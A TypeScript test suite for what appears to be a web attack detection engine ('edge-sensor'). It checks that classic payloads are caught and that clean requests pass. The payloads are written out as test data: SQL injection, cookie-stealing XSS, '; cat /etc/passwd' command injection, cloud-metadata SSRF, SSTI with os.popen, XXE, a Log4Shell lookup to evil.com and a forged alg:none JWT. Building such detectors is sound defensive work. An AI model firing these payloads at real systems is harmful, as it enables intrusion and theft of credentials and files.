/**
 * @santh/edge-sensor — Integration Tests
 *
 * Tests the full detection pipeline with real-world attack payloads.
 * Each test exercises the complete path: request → detection → scoring → decision.
 *
 * These tests validate behavioral contracts established in the INVARIANT architecture:
 *   1. Known attack patterns MUST be detected
 *   2. Clean requests MUST pass without signals
 *   3. Defense mode determines action (monitor vs enforce)
 *   4. Multi-layer detection convergence must elevate confidence
 *   5. Body analysis must catch body-only attacks
 *   6. Chain correlation must detect multi-step sequences
 */

import { describe, it, expect, beforeEach } from 'vitest'
import { InvariantEngine } from '../../../engine/src/invariant-engine'
import { runL2Evaluators, mergeL2Results } from '../../../engine/src/evaluators/evaluator-bridge'
import { ChainCorrelator } from '../../../engine/src/chain-detector'
import {
    analyzeRequestBody,
    extractFromJson,
    extractFromFormEncoded,
    extractFromMultipart,
    ThreatScoringEngine,
    ResponseAuditor,
    ApplicationModel,
    normalizePathPattern,
    detectAuthType,
    detectSensitiveResponse,
    TechStackTracker,
    CveStackCorrelator,
    ReactivationEngine,
    detectConditions,
    PrivilegeGraph,
    PathEnumerator,
    BlastRadiusEngine,
} from '../src/modules/index'


// ══════════════════════════════════════════════════════════════════
// ENGINE DETECTION TESTS
// ══════════════════════════════════════════════════════════════════

describe('InvariantEngine — Core Detection', () => {
    let engine: InvariantEngine

    beforeEach(() => {
        engine = new InvariantEngine()
    })

    // ── SQL Injection ────────────────────────────────────────────
    it('detects UNION-based SQL injection', () => {
        const matches = engine.detect("' UNION SELECT username, password FROM users--", [])
        expect(matches.length).toBeGreaterThan(0)
        const sqlMatch = matches.find(m => m.category === 'sqli')
        expect(sqlMatch).toBeDefined()
        expect(sqlMatch!.confidence).toBeGreaterThanOrEqual(0.7)
    })

    it('detects boolean-blind SQL injection', () => {
        const matches = engine.detect("' OR '1'='1", [])
        expect(matches.length).toBeGreaterThan(0)
    })

    it('detects time-blind SQL injection', () => {
        const matches = engine.detect("'; WAITFOR DELAY '0:0:5'--", [])
        expect(matches.length).toBeGreaterThan(0)
    })

    it('detects stacked queries', () => {
        const matches = engine.detect("'; DROP TABLE users;--", [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── XSS ──────────────────────────────────────────────────────
    it('detects script tag injection', () => {
        const matches = engine.detect('<script>alert(document.cookie)</script>', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    it('detects event handler XSS', () => {
        const matches = engine.detect('<img onerror="alert(1)" src=x>', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    it('detects SVG-based XSS', () => {
        const matches = engine.detect('<svg/onload=alert(1)>', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── Command Injection ────────────────────────────────────────
    it('detects shell command injection', () => {
        const matches = engine.detect('; cat /etc/passwd', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    it('detects subshell command injection', () => {
        const matches = engine.detect('$(id)', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── SSRF ─────────────────────────────────────────────────────
    it('detects internal network SSRF', () => {
        const matches = engine.detect('http://127.0.0.1:8080/admin', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    it('detects cloud metadata SSRF', () => {
        const matches = engine.detect('http://169.254.169.254/latest/meta-data/', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── SSTI ─────────────────────────────────────────────────────
    it('detects Jinja2/Twig SSTI', () => {
        const matches = engine.detect('{{config.__class__.__init__.__globals__}}', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── Path Traversal ───────────────────────────────────────────
    it('detects directory traversal', () => {
        const matches = engine.detect('../../etc/passwd', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── Deserialization ──────────────────────────────────────────
    it('detects PHP deserialization', () => {
        const matches = engine.detect('O:4:"User":1:{s:4:"role";s:5:"admin";}', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── Prototype Pollution ──────────────────────────────────────
    it('detects __proto__ pollution', () => {
        const matches = engine.detect('{"__proto__":{"isAdmin":true}}', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── Log4Shell ────────────────────────────────────────────────
    it('detects Log4Shell JNDI lookup', () => {
        const matches = engine.detect('${jndi:ldap://evil.com/exploit}', [])
        expect(matches.length).toBeGreaterThan(0)
    })

    // ── False Positive Resistance ────────────────────────────────
    it('does NOT flag clean JSON', () => {
        const matches = engine.detect('{"name":"John","email":"john@example.com","age":30}', [])
        expect(matches.length).toBe(0)
    })

    it('does NOT flag clean URLs', () => {
        const matches = engine.detect('/api/users/123/profile?lang=en&theme=dark', [])
        expect(matches.length).toBe(0)
    })

    it('does NOT flag normal search queries', () => {
        const matches = engine.detect('SELECT your favorite product from our collection', [])
        // This may trigger a low-confidence match — acceptable if confidence is low
        const highConfidence = matches.filter(m => m.confidence > 0.7)
        expect(highConfidence.length).toBe(0)
    })
})


// ══════════════════════════════════════════════════════════════════
// L2 EVALUATOR BRIDGE TESTS
// ══════════════════════════════════════════════════════════════════

describe('L2 Evaluator Bridge', () => {
    const engine = new InvariantEngine()

    it('L2 catches SQL tautology that L1 might miss with obfuscation', () => {
        const input = "admin'/**/OR/**/1=1/**/--"
        const l1Matches = engine.detect(input, [])
        const l1Classes = new Set(l1Matches.map(m => m.class))
        const l2Results = runL2Evaluators(input, l1Classes)

        // L2 should detect structural SQL patterns
        const allResults = mergeL2Results(l1Matches, l2Results)
        expect(allResults.length).toBeGreaterThan(0)
    })

    it('L2 detects XXE entity declaration', () => {
        const input = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        const l1Matches = engine.detect(input, [])
        const l1Classes = new Set(l1Matches.map(m => m.class))
        const l2Results = runL2Evaluators(input, l1Classes)
        const allResults = mergeL2Results(l1Matches, l2Results)
        expect(allResults.length).toBeGreaterThan(0)
    })

    it('convergent detection upgrades confidence', () => {
        const input = "' UNION SELECT 1,2,3,4,5--"
        const l1Matches = engine.detect(input, [])
        const l1Classes = new Set(l1Matches.map(m => m.class))
        const l2Results = runL2Evaluators(input, l1Classes)
        const merged = mergeL2Results(l1Matches, l2Results)

        // If both L1 and L2 caught the same class, confidence should be >= L1
        if (l1Matches.length > 0 && l2Results.length > 0) {
            const l1Max = Math.max(...l1Matches.map(m => m.confidence))
            const mergedMax = Math.max(...merged.map(m => m.confidence))
            expect(mergedMax).toBeGreaterThanOrEqual(l1Max)
        }
    })
})


// ══════════════════════════════════════════════════════════════════
// CHAIN CORRELATOR TESTS
// ══════════════════════════════════════════════════════════════════

describe('ChainCorrelator — Attack Sequence Detection', () => {
    let correlator: ChainCorrelator

    beforeEach(() => {
        correlator = new ChainCorrelator()
    })

    it('detects LFI → credential extraction chain', () => {
        const source = 'test-hash-1'
        const now = Date.now()

        // Step 1: Path traversal probe
        correlator.ingest({
            sourceHash: source,
            classes: ['path_dotdot_escape'],
            behaviors: [],
            confidence: 0.7,
            path: '/api/files',
            method: 'GET',
            timestamp: now,
        })

        // Step 2: Sensitive file access
        const matches = correlator.ingest({
            sourceHash: source,
            classes: ['path_dotdot_escape'],
            behaviors: ['path_sensitive_file'],
            confidence: 0.8,
            path: '/api/files?name=../../etc/passwd',
            method: 'GET',
            timestamp: now + 5000,
        })

        expect(matches.length).toBeGreaterThan(0)
        expect(matches[0].chainId).toBe('lfi_credential_theft')
        expect(matches[0].stepsMatched).toBeGreaterThanOrEqual(2)
    })

    it('detects automated scanner → targeted exploit chain', () => {
        const source = 'scanner-hash'
        const now = Date.now()

        // Step 1: Scanner behavior
        correlator.ingest({
            sourceHash: source,
            classes: [],
            behaviors: ['scanner_detected', 'path_spray'],
            confidence: 0.9,
            path: '/',
            method: 'GET',
            timestamp: now,
        })

        // Step 2: Targeted SQLi
        const matches = correlator.ingest({
            sourceHash: source,
            classes: ['sql_string_termination'],
            behaviors: [],
            confidence: 0.75,
            path: '/api/search',
            method: 'GET',
            timestamp: now + 30000,
        })

        expect(matches.length).toBeGreaterThan(0)
        expect(matches[0].chainId).toBe('automated_attack_pipeline')
    })

    it('does NOT match chains across different sources', () => {
        const now = Date.now()

        correlator.ingest({
            sourceHash: 'source-a',
            classes: ['path_dotdot_escape'],
            behaviors: [],
            confidence: 0.7,
            path: '/api/files',
            method: 'GET',
            timestamp: now,
        })

        const matches = correlator.ingest({
            sourceHash: 'source-b',
            classes: ['path_dotdot_escape'],
            behaviors: ['path_sensitive_file'],
            confidence: 0.8,
            path: '/api/files',
            method: 'GET',
            timestamp: now + 5000,
        })

        // Source B alone shouldn't form a full chain (only 1 step from source B)
        const lfiChain = matches.find(m => m.chainId === 'lfi_credential_theft')
        if (lfiChain) {
            // Should only be 1 step matched for source B
            expect(lfiChain.stepsMatched).toBeLessThan(3)
        }
    })
})


// ══════════════════════════════════════════════════════════════════
// THREAT SCORING TESTS
// ══════════════════════════════════════════════════════════════════

describe('ThreatScoringEngine', () => {
    let scorer: ThreatScoringEngine

    beforeEach(() => {
        scorer = new ThreatScoringEngine()
    })

    it('scores critical signals as hostile', () => {
        const result = scorer.score(
            [{
                source: 'invariant' as const,
                type: 'cmdi',
                subtype: 'cmd_separator',
                confidence: 0.9,
                severity: 'critical' as const,
                linkedCves: [],
                linkedTechniques: [],
                isNovel: false,
            }],
            {
                sourceHash: 'test',
                knownAttacker: false,
                priorSignalCount: 0,
                requestsInWindow: 1,
            },
        )

        expect(result.classification).toBe('hostile')
        expect(result.shouldBlock).toBe(true)
        expect(result.score).toBeGreaterThanOrEqual(50)
    })

    it('scores clear requests as non-hostile', () => {
        const result = scorer.score(
            [],
            {
                sourceHash: 'clean',
                knownAttacker: false,
                priorSignalCount: 0,
                requestsInWindow: 1,
            },
        )

        expect(result.classification).toBe('clear')
        expect(result.shouldBlock).toBe(false)
        expect(result.score).toBe(0)
    })

    it('known attackers get elevated scores', () => {
        const signal = {
            source: 'static' as const,
            type: 'sql_injection',
            subtype: 'union_based',
            confidence: 0.6,
            severity: 'medium' as const,
            linkedCves: [],
            linkedTechniques: [],
            isNovel: false,
        }

        const normalScore = scorer.score([signal], {
            sourceHash: 'normal', knownAttacker: false, priorSignalCount: 0, requestsInWindow: 1,
        })

        const attackerScore = scorer.score([signal], {
            sourceHash: 'attacker', knownAttacker: true, priorSignalCount: 5, requestsInWindow: 50,
        })

        expect(attackerScore.score).toBeGreaterThan(normalScore.score)
    })
})


// ══════════════════════════════════════════════════════════════════
// BODY ANALYSIS TESTS
// ══════════════════════════════════════════════════════════════════

describe('Body Analysis', () => {
    it('extracts values from JSON body', () => {
        const values = extractFromJson('{"user":"admin","query":"SELECT * FROM users"}')
        expect(values).toContain('admin')
        expect(values).toContain('SELECT * FROM users')
    })

    it('extracts values from form-encoded body', () => {
        const values = extractFromFormEncoded("username=admin&password=' OR '1'='1")
        expect(values.some(v => v.includes("OR '1'='1"))).toBe(true)
    })

    it('extracts keys as potential attack vectors', () => {
        const values = extractFromJson('{"__proto__":{"isAdmin":true}}')
        expect(values).toContain('__proto__')
    })

    it('handles nested JSON objects', () => {
        const values = extractFromJson('{"a":{"b":{"c":"deep_value"}}}')
        expect(values).toContain('deep_value')
    })

    it('handles malformed JSON gracefully', () => {
        const values = extractFromJson('not valid json {malformed')
        expect(values.length).toBeGreaterThan(0) // Should return as raw text
    })
})


// ══════════════════════════════════════════════════════════════════
// APPLICATION MODEL TESTS
// ══════════════════════════════════════════════════════════════════

describe('ApplicationModel', () => {
    let model: ApplicationModel

    beforeEach(() => {
        model = new ApplicationModel()
    })

    it('tracks endpoint patterns', () => {
        model.recordRequest('/api/users/123/profile', 'GET', 'bearer')
        model.recordRequest('/api/users/456/profile', 'GET', 'bearer')

        expect(model.endpointCount).toBe(1) // Both normalized to same pattern
    })

    it('tracks auth distribution', () => {
        model.recordRequest('/api/public/data', 'GET', 'anonymous')
        model.recordRequest('/api/admin/settings', 'GET', 'bearer')

        const snapshot = model.snapshot('test-sensor')
        expect(snapshot.totalEndpoints).toBe(2)
    })

    it('assigns sensitive flag to sensitive paths', () => {
        model.recordRequest('/api/users/1/settings', 'GET', 'bearer')
        model.recordResponse('/api/users/1/settings', 200, 'application/json', 500, true)

        const ep = model.getEndpoint('/api/users/1/settings')
        expect(ep?.sensitive).toBe(true)
    })
})


// ══════════════════════════════════════════════════════════════════
// PATH NORMALIZATION TESTS
// ══════════════════════════════════════════════════════════════════

describe('normalizePathPattern', () => {
    it('normalizes numeric IDs', () => {
        expect(normalizePathPattern('/api/users/123/posts')).toBe('/api/users/{id}/posts')
    })

    it('normalizes UUIDs', () => {
        expect(normalizePathPattern('/api/orders/a1b2c3d4-e5f6-7890-abcd-ef1234567890')).toBe('/api/orders/{uuid}')
    })

    it('normalizes hash tokens', () => {
        expect(normalizePathPattern('/api/tokens/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6')).toBe('/api/tokens/{hash}')
    })

    it('preserves API version prefixes', () => {
        expect(normalizePathPattern('/api/v2/users/42')).toContain('v2')
    })
})


// ══════════════════════════════════════════════════════════════════
// AUTH TYPE DETECTION TESTS
// ══════════════════════════════════════════════════════════════════

describe('detectAuthType', () => {
    it('detects bearer token', () => {
        const headers = new Headers({ authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9...' })
        expect(detectAuthType(headers)).toBe('bearer')
    })

    it('detects basic auth', () => {
        const headers = new Headers({ authorization: 'Basic dXNlcjpwYXNz' })
        expect(detectAuthType(headers)).toBe('basic')
    })

    it('detects API key via header', () => {
        const headers = new Headers({ 'x-api-key': 'sk_test_123' })
        expect(detectAuthType(headers)).toBe('api_key')
    })

    it('returns anonymous when no auth present', () => {
        const headers = new Headers({ 'accept': 'text/html' })
        expect(detectAuthType(headers)).toBe('anonymous')
    })
})


// ══════════════════════════════════════════════════════════════════
// RESPONSE AUDITOR TESTS
// ══════════════════════════════════════════════════════════════════

describe('ResponseAuditor', () => {
    let auditor: ResponseAuditor

    beforeEach(() => {
        auditor = new ResponseAuditor()
    })

    it('flags missing Strict-Transport-Security', () => {
        const response = new Response('OK', {
            headers: { 'content-type': 'text/html' },
        })
        const findings = auditor.audit(response, '/test')
        const hstsFinding = findings.find(f => f.finding.toLowerCase().includes('strict-transport-security'))
        expect(hstsFinding).toBeDefined()
    })

    it('flags X-Powered-By version leak', () => {
        const response = new Response('OK', {
            headers: {
                'content-type': 'text/html',
                'x-powered-by': 'Express 4.17.1',
            },
        })
        const findings = auditor.audit(response, '/test')
        const poweredBy = findings.find(f => f.category === 'version_leak')
        expect(poweredBy).toBeDefined()
    })

    it('generates posture report with grade', () => {
        const response = new Response('OK', { headers: { 'content-type': 'text/html' } })
        auditor.audit(response, '/page1')

        const report = auditor.generateReport('example.com')
        expect(report.grade).toBeDefined()
        expect(['A', 'B', 'C', 'D', 'F']).toContain(report.grade)
        expect(report.score).toBeLessThanOrEqual(100)
        expect(report.score).toBeGreaterThanOrEqual(0)
    })
})


// ══════════════════════════════════════════════════════════════════
// CVE-STACK CORRELATION TESTS
// ══════════════════════════════════════════════════════════════════

describe('CveStackCorrelator', () => {
    it('maps WordPress to correct CPE', () => {
        const correlator = new CveStackCorrelator()
        const cpe = correlator.getCpe('wordpress')
        expect(cpe).toBeDefined()
        expect(cpe!.vendor).toBe('wordpress')
        expect(cpe!.product).toBe('wordpress')
        expect(cpe!.common_cwes).toContain('CWE-79')
    })

    it('builds vulnerability profile from tech stack', () => {
        const tracker = new TechStackTracker()
        tracker.record('wordpress')
        tracker.record('php')
        tracker.record('nginx')

        const correlator = new CveStackCorrelator()
        const profile = correlator.buildProfile(tracker)

        expect(profile.components.length).toBe(3)
        expect(profile.aggregateCWEs.length).toBeGreaterThan(0)
    })

    it('returns CWEs for a given stack', () => {
        const correlator = new CveStackCorrelator()
        const cwes = correlator.getCWEsForStack(['wordpress', 'php'])
        expect(cwes).toContain('CWE-79')
        expect(cwes).toContain('CWE-89')
    })
})


// ══════════════════════════════════════════════════════════════════
// PRIVILEGE GRAPH TESTS
// ══════════════════════════════════════════════════════════════════

describe('PrivilegeGraph', () => {
    it('classifies admin endpoints as elevated', () => {
        const graph = new PrivilegeGraph()
        const snapshot = graph.buildGraph([
            {
                pattern: '/admin/settings',
                methods: { GET: 10, POST: 5 },
                auth: { bearer: 15, anonymous: 0 },
                sensitive: true,
                requestCount: 15,
            },
        ], 'test-sensor')

        expect(snapshot.endpoints[0].level).toBe('elevated')
    })

    it('classifies public endpoints correctly', () => {
        const graph = new PrivilegeGraph()
        const snapshot = graph.buildGraph([
            {
                pattern: '/api/products',
                methods: { GET: 100 },
                auth: { anonymous: 95, bearer: 5 },
                sensitive: false,
                requestCount: 100,
            },
        ], 'test-sensor')

        expect(snapshot.endpoints[0].level).toBe('public')
    })

    it('detects sensitive_public observation', () => {
        const graph = new PrivilegeGraph()
        const snapshot = graph.buildGraph([
            {
                pattern: '/api/user/profile',
                methods: { GET: 20 },
                auth: { anonymous: 20 },
                sensitive: true,
                requestCount: 20,
            },
        ], 'test-sensor')

        const obs = snapshot.observations.find(o => o.type === 'sensitive_public')
        expect(obs).toBeDefined()
        expect(obs!.severity).toBe('critical')
    })
})


// ══════════════════════════════════════════════════════════════════
// REACTIVATION ENGINE TESTS
// ══════════════════════════════════════════════════════════════════

describe('ReactivationEngine', () => {
    it('detects reactivation from missing security headers', () => {
        const engine = new ReactivationEngine()
        const conditions = detectConditions([
            { finding: 'Missing X-Content-Type-Options: nosniff', severity: 'medium', category: 'header' },
        ])

        if (conditions.length > 0) {
            const report = engine.generateReport(conditions)
            expect(report.total_reactivations).toBeGreaterThanOrEqual(0)
        }
    })

    it('cross-references reactivations with CVEs', () => {
        const engine = new ReactivationEngine()
        const conditions = detectConditions([
            { finding: 'Missing Content-Security-Policy', severity: 'high', category: 'header' },
        ])

        if (conditions.length > 0) {
            const matches = engine.analyze(conditions)
            const crossRef = engine.crossReference(matches, ['CWE-79', 'CWE-89'])
            expect(crossRef).toBeDefined()
        }
    })
})


// ══════════════════════════════════════════════════════════════════
// SENSITIVE RESPONSE DETECTION TESTS
// ══════════════════════════════════════════════════════════════════

describe('detectSensitiveResponse', () => {
    it('flags user profile paths as sensitive', () => {
        const headers = new Headers({ 'content-type': 'application/json' })
        expect(detectSensitiveResponse('/api/user/profile', headers, 200)).toBe(true)
    })

    it('flags 401 responses as sensitive', () => {
        const headers = new Headers()
        expect(detectSensitiveResponse('/api/data', headers, 401)).toBe(true)
    })

    it('does not flag public static assets', () => {
        const headers = new Headers({
            'content-type': 'text/css',
            'cache-control': 'public, max-age=31536000',
        })
        expect(detectSensitiveResponse('/static/styles.css', headers, 200)).toBe(false)
    })
})


// ══════════════════════════════════════════════════════════════════
// HEADER INVARIANT DETECTION TESTS
// ══════════════════════════════════════════════════════════════════

describe('InvariantEngine — Header Invariants', () => {
    let engine: InvariantEngine

    beforeEach(() => {
        engine = new InvariantEngine()
    })

    it('detects JWT alg:none bypass in Authorization header', () => {
        // JWT with alg:none — the header is {"alg":"none","typ":"JWT"} base64
        const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }))
        const payload = btoa(JSON.stringify({ sub: '1234', role: 'admin' }))
        const headers = new Headers({
            authorization: `Bearer ${header}.${payload}.`,
        })
        const matches = engine.detectHeaderInvariants(headers)
        const jwtMatch = matches.find(m => m.class === 'auth_none_algorithm')
        expect(jwtMatch).toBeDefined()
        expect(jwtMatch!.severity).toBe('critical')
    })

    it('detects IP spoofing via multiple forwarding headers', () => {
        const headers = new Headers({
            'x-forwarded-for': '1.2.3.4',
            'x-real-ip': '5.6.7.8',
            'x-originating-ip': '9.10.11.12',
            'x-remote-ip': '13.14.15.16',
        })
        const matches = engine.detectHeaderInvariants(headers)
        const spoofMatch = matches.find(m => m.class === 'auth_header_spoof')
        expect(spoofMatch).toBeDefined()
    })

    it('detects URL rewrite bypass via X-Original-URL', () => {
        const headers = new Headers({
            'x-original-url': '/admin/dashboard',
        })
        const matches = engine.detectHeaderInvariants(headers)
        const rewriteMatch = matches.find(m => m.class === 'auth_header_spoof')
        expect(rewriteMatch).toBeDefined()
        expect(rewriteMatch!.severity).toBe('high')
    })

    it('does NOT flag normal browser headers', () => {
        const headers = new Headers({
            'accept': 'text/html',
            'accept-language': 'en-US',
            'accept-encoding': 'gzip, deflate',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        })
        const matches = engine.detectHeaderInvariants(headers)
        expect(matches.length).toBe(0)
    })
})


// ══════════════════════════════════════════════════════════════════
// BODY-ONLY ATTACK DETECTION TESTS
// ══════════════════════════════════════════════════════════════════

describe('InvariantEngine — Body Attack Detection', () => {
    let engine: InvariantEngine

    beforeEach(() => {
        engine = new InvariantEngine()
    })

    it('detects SQL injection embedded in JSON body', () => {
        const bodyJson = JSON.stringify({ search: "' UNION SELECT username, password FROM users--" })
        const bodyValues = extractFromJson(bodyJson)
        const allMatches = bodyValues.flatMap((v: string) => engine.detect(v, []))
        const sqlMatch = allMatches.find((m: { category: string }) => m.category === 'sqli')
        expect(sqlMatch).toBeDefined()
    })

    it('detects XSS in form-encoded body', () => {
        const bodyValues = extractFromFormEncoded('name=test&comment=<script>alert(document.cookie)</script>')
        const allMatches = bodyValues.flatMap(v => engine.detect(v, []))
        const xssMatch = allMatches.find(m => m.category === 'xss')
        expect(xssMatch).toBeDefined()
    })

    it('detects prototype pollution in JSON body keys', () => {
        const bodyValues = extractFromJson('{"constructor": {"prototype": {"isAdmin": true}}}')
        const allMatches = bodyValues.flatMap(v => engine.detect(v, []))
        expect(allMatches.length).toBeGreaterThan(0)
    })

    it('detects SSTI payloads in form-encoded body', () => {
        const bodyValues = extractFromFormEncoded("template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}")
        const allMatches = bodyValues.flatMap(v => engine.detect(v, []))
        const sstiMatch = allMatches.find(m => m.category === 'xss' || m.class?.includes('ssti'))
        expect(allMatches.length).toBeGreaterThan(0)
    })
})


// ══════════════════════════════════════════════════════════════════
// INVARIANT MATCH DEDUPLICATION TESTS
// ══════════════════════════════════════════════════════════════════

describe('InvariantEngine — Deduplication', () => {
    it('deduplicates same class from multiple inputs, keeping highest confidence', () => {
        const engine = new InvariantEngine()
        const input1 = "' OR 1=1--"
        const input2 = "' OR 'a'='a'--"

        const matches1 = engine.detect(input1, [])
        const matches2 = engine.detect(input2, [])

        // Both should detect sql_tautology
        const classes1 = matches1.map(m => m.class)
        const classes2 = matches2.map(m => m.class)
        const common = classes1.filter(c => classes2.includes(c))

        // If there are common classes, dedup via Map should yield only one per class
        if (common.length > 0) {
            const dedupMap = new Map<string, { confidence: number }>()
            for (const m of [...matches1, ...matches2]) {
                const existing = dedupMap.get(m.class)
                if (!existing || m.confidence > existing.confidence) {
                    dedupMap.set(m.class, { confidence: m.confidence })
                }
            }
            expect(dedupMap.size).toBeLessThanOrEqual(matches1.length + matches2.length)
        }
    })

    it('reports each unique class exactly once', () => {
        const engine = new InvariantEngine()
        // This input triggers multiple SQL-related invariant classes
        const input = "'; DROP TABLE users; SLEEP(5)--"
        const matches = engine.detect(input, [])

        // Each class should appear at most once
        const classCounts = new Map<string, number>()
        for (const m of matches) {
            classCounts.set(m.class, (classCounts.get(m.class) ?? 0) + 1)
        }
        for (const [cls, count] of classCounts) {
            expect(count).toBe(1)
        }
    })
})


// ══════════════════════════════════════════════════════════════════
// ENGINE SELF-VALIDATION TESTS
// ══════════════════════════════════════════════════════════════════

describe('InvariantEngine — Self-Validation', () => {
    it('detects all its own generated variants', () => {
        const engine = new InvariantEngine()
        const failedClasses: string[] = []

        for (const cls of engine.classes) {
            const variants = engine.generateVariants(cls, 3)
            if (variants.length === 0) continue

            let detected = false
            for (const variant of variants) {
                const matches = engine.detect(variant, [])
                if (matches.some(m => m.class === cls)) {
                    detected = true
                    break
                }
            }
            if (!detected) failedClasses.push(cls)
        }

        // Every L1 class should detect at least one of its own variants
        expect(failedClasses).toEqual([])
    })

    it('has at least 28 invariant classes registered', () => {
        const engine = new InvariantEngine()
        expect(engine.classCount).toBeGreaterThanOrEqual(28)
    })
})

